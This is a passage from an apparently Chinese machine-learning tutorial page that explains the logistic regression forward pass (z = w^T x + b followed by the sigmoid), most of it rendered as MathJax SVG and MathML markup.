404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(3227.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(3671.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(4680.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5125,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5569.7,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6014.3,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6459,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(6903.7,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(7982.9,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">x</mi></mrow><mo>=</mo><mo stretchy="false">[</mo><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><msub><mi>x</mi><mn>2</mn></msub><mo>,</mo><mo>.</mo><mo>.</mo><mo>.</mo><mo>,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container>，权重是 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="20.174ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 8916.9 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D430" d="M624 444Q636 441 722 441Q797 441 800 444H805V382H741L593 11Q592 10 590 8T586 4T584 2T581 0T579 -2T575 -3T571 -3T567 -4T561 -4T553 -4H542Q525 -4 518 6T490 70Q474 110 463 137L415 257L367 137Q357 111 341 72Q320 17 313 7T289 -4H277Q259 -4 253 -2T238 11L90 382H25V444H32Q47 441 140 441Q243 441 261 444H270V382H222L310 164L382 342L366 382H303V444H310Q322 441 407 441Q508 441 523 444H531V382H506Q481 382 481 380Q482 376 529 259T577 142L674 382H617V444H624Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1108.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2164.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(2442.6,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(749,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(3595.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(4039.8,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(749,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(5192.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5637,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6081.7,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6526.3,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6971,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(7415.7,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(749,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(8638.9,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">w</mi></mrow><mo>=</mo><mo stretchy="false">[</mo><msub><mi>w</mi><mn>1</mn></msub><mo>,</mo><msub><mi>w</mi><mn>2</mn></msub><mo>,</mo><mo>.</mo><mo>.</mo><mo>.</mo><mo>,</mo><msub><mi>w</mi><mi>n</mi></msub><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container>，偏置为 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 429 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>b</mi></math></mjx-assistive-mml></mjx-container>，则模型计算步骤如下：</p><ol><li>线性部分</li></ol><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="12.373ex" height="2.203ex" role="img" focusable="false" viewbox="0 -891.7 5468.8 973.7" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(1798.6,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D430" d="M624 444Q636 441 722 441Q797 441 800 444H805V382H741L593 11Q592 10 590 8T586 4T584 2T581 0T579 -2T575 -3T571 -3T567 -4T561 -4T553 -4H542Q525 -4 518 6T490 70Q474 110 463 137L415 257L367 137Q357 111 341 72Q320 17 313 7T289 -4H277Q259 -4 253 -2T238 11L90 382H25V444H32Q47 441 140 441Q243 441 261 444H270V382H222L310 164L382 342L366 382H303V444H310Q322 441 407 441Q508 441 523 444H531V382H506Q481 382 481 380Q482 376 529 259T577 142L674 382H617V444H624Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mi" transform="translate(864,413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z" style="stroke-width: 3;"/></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3210.4,0)"><g data-mml-node="mi"><path data-c="1D431" d="M227 0Q212 3 121 3Q40 3 28 0H21V62H117L245 213L109 382H26V444H34Q49 441 143 441Q247 441 265 444H274V382H246L281 339Q315 297 316 297Q320 297 354 341L389 382H352V444H360Q375 441 466 441Q547 441 559 444H566V382H471L355 246L504 63L545 62H586V0H578Q563 3 469 3Q365 3 347 0H338V62H366Q366 63 326 112T285 163L198 63L217 62H235V0H227Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(4039.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(5039.8,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>z</mi><mo>=</mo><msup><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">w</mi></mrow><mi>T</mi></msup><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">x</mi></mrow><mo>+</mo><mi>b</mi></math></mjx-assistive-mml></mjx-container><ol start="2"><li>激活（非线性）部分，用 sigmoid 函数将结果压缩成概率：</li></ol><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -1.738ex;" xmlns="http://www.w3.org/2000/svg" width="19.37ex" height="4.774ex" role="img" focusable="false" viewbox="0 -1342 8561.5 2110" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1823.6,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2394.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2783.6,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3248.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3915.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(4971.1,0)"><g data-mml-node="mn" transform="translate(1545.2,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(1722.4,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(499,289) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(778,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g></g></g></g><rect width="3350.4" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: 